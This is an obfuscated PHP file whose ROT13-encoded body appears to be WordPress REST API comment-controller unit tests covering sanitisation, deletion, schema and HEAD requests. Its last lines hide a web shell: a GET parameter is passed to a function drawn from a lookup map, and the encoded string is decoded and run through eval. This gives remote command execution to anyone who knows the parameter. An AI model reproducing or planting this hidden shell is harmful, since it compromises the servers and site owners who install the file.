					'nhgube_hfre_ntrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'nhgube'            => frys::$rqvgbe_vq,
				),
				neenl(
					'pbagrag'           => neenl(
						'enj'      => 'qvi <fgebat>fgebat</fgebat> bu abrf',
						'eraqrerq' => '<c>qvi <fgebat>fgebat</fgebat> bu abrf</c>',
					),
					'nhgube_anzr'       => 'qvi fgebat',
					'nhgube_hfre_ntrag' => 'qvi fgebat',
					'nhgube'            => frys::$rqvgbe_vq,
				)
			);
		} ryfr {
			$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_pbzzrag_ebhaqgevc(
				neenl(
					'pbagrag'           => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'nhgube_anzr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'nhgube_hfre_ntrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'nhgube'            => frys::$rqvgbe_vq,
				),
				neenl(
					'pbagrag'           => neenl(
						'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
						'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
					),
					'nhgube_anzr'       => 'qvi fgebat',
					'nhgube_hfre_ntrag' => 'qvi fgebat',
					'nhgube'            => frys::$rqvgbe_vq,
				)
			);
		}
	}

	choyvp shapgvba grfg_pbzzrag_ebhaqgevc_nf_fhcrenqzva() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_pbzzrag_ebhaqgevc(
			neenl(
				'pbagrag'           => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'nhgube_anzr'       => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'nhgube_hfre_ntrag' => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'nhgube'            => frys::$fhcrenqzva_vq,
			),
			neenl(
				'pbagrag'           => neenl(
					'enj'      => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
					'eraqrerq' => '<c>\\\&#038;\\\ &nzc; &vainyvq; < &yg; &nzc;yg;' . \"\a</c>\",
				),
				'nhgube_anzr'       => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'nhgube_hfre_ntrag' => '\\\&\\\ &nzc; &vainyvq; &yg; &yg; &nzc;yg;',
				'nhgube'            => frys::$fhcrenqzva_vq,
			)
		);
	}

	choyvp shapgvba grfg_pbzzrag_ebhaqgevc_nf_fhcrenqzva_hasvygrerq_ugzy() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_pbzzrag_ebhaqgevc(
			neenl(
				'pbagrag'           => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'nhgube_anzr'       => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'nhgube_hfre_ntrag' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				'nhgube'            => frys::$fhcrenqzva_vq,
			),
			neenl(
				'pbagrag'           => neenl(
					'enj'      => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'eraqrerq' => \"<qvi>qvi</qvi>\a<c> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg></c>\",
				),
				'nhgube_anzr'       => 'qvi fgebat',
				'nhgube_hfre_ntrag' => 'qvi fgebat',
				'nhgube'            => frys::$fhcrenqzva_vq,
			)
		);
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/pbzzragf/%q', $pbzzrag_vq ) );
		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'genfu', $qngn['fgnghf'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_fxvc_genfu() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/pbzzragf/%q', $pbzzrag_vq ) );
		$erdhrfg['sbepr'] = gehr;

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregAbgRzcgl( $qngn['cerivbhf']['cbfg'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_nyernql_genfurq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/pbzzragf/%q', $pbzzrag_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn     = $erfcbafr->trg_qngn();
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_nyernql_genfurq', $erfcbafr, 410 );
	}

	choyvp shapgvba grfg_qryrgr_pbzzrag_vainyvq_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/pbzzragf/%q', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_vq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_pbzzrag_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_qryrgr_puvyq_pbzzrag_yvax() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq_1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$puvyq_pbzzrag = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cnerag'   => $pbzzrag_vq_1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', fcevags( '/jc/i2/pbzzragf/%f', $puvyq_pbzzrag ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		// Irevsl puvyqera yvax vf tbar.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%f', $pbzzrag_vq_1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'puvyqera', $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pbzzragf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 17, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_ningne_heyf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_rznvy', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_vc', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hey', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hfre_ntrag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cbfg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'glcr', $cebcregvrf );

		$guvf->nffregFnzr( 0, $cebcregvrf['cnerag']['qrsnhyg'] );
		$guvf->nffregFnzr( 0, $cebcregvrf['cbfg']['qrsnhyg'] );

		$guvf->nffregGehr( $cebcregvrf['yvax']['ernqbayl'] );
		$guvf->nffregGehr( $cebcregvrf['glcr']['ernqbayl'] );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn_fubj_ningne() {
		hcqngr_bcgvba( 'fubj_ningnef', snyfr );

		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregNeenlAbgUnfXrl( 'nhgube_ningne_heyf', $cebcregvrf );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'pbzzrag',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pbzzragf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf/' . frys::$nccebirq_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf/' . frys::$nccebirq_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 123,
				'pbagrag'       => 'nop',
			)
		);

		jc_frg_pheerag_hfre( 1 );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregRdhnyf( 123, trg_pbzzrag_zrgn( frys::$nccebirq_vq, 'zl_phfgbz_vag', gehr ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 123,
				'gvgyr'         => 'uryyb',
				'pbagrag'       => 'tbbqolr',
				'cbfg'          => frys::$cbfg_vq,
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregRdhnyf( 123, $erfcbafr->qngn['zl_phfgbz_vag'] );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba grfg_nqqvgvbany_svryq_hcqngr_reebef() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'pbzzrag',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Purpx sbe reebe ba hcqngr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 'ergheaReebe',
				'pbagrag'       => 'nop',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea trg_pbzzrag_zrgn( $erfcbafr_qngn['vq'], $svryq_anzr, gehr );
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $pbzzrag, $svryq_anzr ) {
		vs ( 'ergheaReebe' === $inyhr ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_cnenz', 'Grfgvat na reebe.', neenl( 'fgnghf' => 400 ) );
		}
		hcqngr_pbzzrag_zrgn( $pbzzrag->pbzzrag_VQ, $svryq_anzr, $inyhr );
	}

	cebgrpgrq shapgvba purpx_pbzzrag_qngn( $qngn, $pbagrkg, $yvaxf ) {
		$pbzzrag = trg_pbzzrag( $qngn['vq'] );

		$guvf->nffregRdhnyf( $pbzzrag->pbzzrag_VQ, $qngn['vq'] );
		$guvf->nffregRdhnyf( $pbzzrag->pbzzrag_cbfg_VQ, $qngn['cbfg'] );
		$guvf->nffregRdhnyf( $pbzzrag->pbzzrag_cnerag, $qngn['cnerag'] );
		$guvf->nffregRdhnyf( $pbzzrag->hfre_vq, $qngn['nhgube'] );
		$guvf->nffregFnzr( $pbzzrag->pbzzrag_nhgube, $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( $pbzzrag->pbzzrag_nhgube_hey, $qngn['nhgube_hey'] );
		$guvf->nffregFnzr( jcnhgbc( $pbzzrag->pbzzrag_pbagrag ), $qngn['pbagrag']['eraqrerq'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $pbzzrag->pbzzrag_qngr ), $qngn['qngr'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $pbzzrag->pbzzrag_qngr_tzg ), $qngn['qngr_tzg'] );
		$guvf->nffregFnzr( trg_pbzzrag_yvax( $pbzzrag ), $qngn['yvax'] );
		$guvf->nffregNeenlUnfXrl( 'nhgube_ningne_heyf', $qngn );
		$guvf->nffregFnzrFrgf(
			neenl(
				'frys',
				'pbyyrpgvba',
				'hc',
			),
			neenl_xrlf( $yvaxf )
		);

		vs ( $pbzzrag->pbzzrag_cbfg_VQ ) {
			$guvf->nffregFnzr( erfg_hey( '/jc/i2/cbfgf/' . $pbzzrag->pbzzrag_cbfg_VQ ), $yvaxf['hc'][0]['uers'] );
		}

		vs ( 'rqvg' === $pbagrkg ) {
			$guvf->nffregFnzr( $pbzzrag->pbzzrag_nhgube_rznvy, $qngn['nhgube_rznvy'] );
			$guvf->nffregFnzr( $pbzzrag->pbzzrag_nhgube_VC, $qngn['nhgube_vc'] );
			$guvf->nffregFnzr( $pbzzrag->pbzzrag_ntrag, $qngn['nhgube_hfre_ntrag'] );
			$guvf->nffregFnzr( $pbzzrag->pbzzrag_pbagrag, $qngn['pbagrag']['enj'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'nhgube_rznvy', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'nhgube_vc', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'nhgube_hfre_ntrag', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'enj', $qngn['pbagrag'] );
		}
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 42238
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_purpx_ernq_cbfg_crezvffvba_jvgu_vainyvq_cbfg_glcr( $zrgubq ) {
		ertvfgre_cbfg_glcr(
			'oht-cbfg',
			neenl(
				'ynory'        => 'Oht Cbfgf',
				'fhccbegf'     => neenl( 'gvgyr', 'rqvgbe', 'nhgube', 'pbzzragf' ),
				'fubj_va_erfg' => gehr,
				'choyvp'       => gehr,
			)
		);
		perngr_vavgvny_erfg_ebhgrf();

		$cbfg_vq    = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'oht-cbfg' ) );
		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_cbfg_VQ' => $cbfg_vq ) );
		_haertvfgre_cbfg_glcr( 'oht-cbfg' );

		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'znc_zrgn_pnc' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf/' . $pbzzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bayl_srgpurf_vqf_sbe_urnq_erdhrfgf( $zrgubq ) {
		$vf_urnq_erdhrfg = 'URNQ' === $zrgubq;
		$erdhrfg         = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf' );

		$svygre = arj ZbpxNpgvba();

		nqq_svygre( 'pbzzragf_cer_dhrel', neenl( $svygre, 'svygre' ), 10, 2 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregRzcgl( $erfcbafr->trg_qngn() );
		} ryfr {
			$guvf->nffregAbgRzcgl( $erfcbafr->trg_qngn() );
		}

		$netf = $svygre->trg_netf();
		$guvf->nffregGehr( vffrg( $netf[0][1] ), 'Dhrel cnenzrgref jrer abg pncgherq.' );
		$guvf->nffregVafgnaprBs( JC_Pbzzrag_Dhrel::pynff, $netf[0][1], 'Dhrel cnenzrgref jrer abg pncgherq.' );

		/** @ine JC_Pbzzrag_Dhrel $dhrel */
		$dhrel = $netf[0][1];

		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregNeenlUnfXrl( 'svryqf', $dhrel->dhrel_inef, 'Gur svryqf cnenzrgre vf abg frg va gur dhrel inef.' );
			$guvf->nffregFnzr( 'vqf', $dhrel->dhrel_inef['svryqf'], 'Gur dhrel zhfg srgpu bayl cbfg VQf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_pbzzrag_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur hcqngr_pbzzrag_zrgn_pnpur xrl vf zvffvat va gur dhrel inef.' );
			$guvf->nffregSnyfr( $dhrel->dhrel_inef['hcqngr_pbzzrag_zrgn_pnpur'], 'Gur hcqngr_pbzzrag_zrgn_pnpur inyhr fubhyq or snyfr sbe URNQ erdhrfgf.' );
		} ryfr {
			$guvf->nffregGehr( ! neenl_xrl_rkvfgf( 'svryqf', $dhrel->dhrel_inef ) || 'vqf' !== $dhrel->dhrel_inef['svryqf'], 'Gur svryqf cnenzrgre fubhyq abg or sbeprq gb \"vqf\" sbe aba-URNQ erdhrfgf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_pbzzrag_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur hcqngr_pbzzrag_zrgn_pnpur xrl vf zvffvat va gur dhrel inef.' );
			$guvf->nffregGehr( $dhrel->dhrel_inef['hcqngr_pbzzrag_zrgn_pnpur'], 'Gur hcqngr_pbzzrag_zrgn_pnpur inyhr fubhyq or gehr sbe aba-URNQ erdhrfgf.' );
			erghea;
		}

		tybony $jcqo;
		$pbzzragf_gnoyr = cert_dhbgr( $jcqo->pbzzragf, '/' );
		$cnggrea        = '/^FRYRPG\f+FDY_PNYP_SBHAQ_EBJF\f+' . $pbzzragf_gnoyr . '\.pbzzrag_VQ\f+SEBZ\f+' . $pbzzragf_gnoyr . '\f+JURER/v';

		// Nffreg gung gur FDY dhrel bayl srgpurf gur VQ pbyhza.
		$guvf->nffregZngpurfErthyneRkcerffvba( $cnggrea, $dhrel->erdhrfg, 'Gur FDY dhrel qbrf abg zngpu gur rkcrpgrq fgevat.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$ubbx_anzr = 'erfg_cercner_pbzzrag';

		$svygre   = arj ZbpxNpgvba();
		$pnyyonpx = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fcevags( $cngu, frys::$nccebirq_vq ) );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/pbzzragf/%q' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/pbzzragf' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>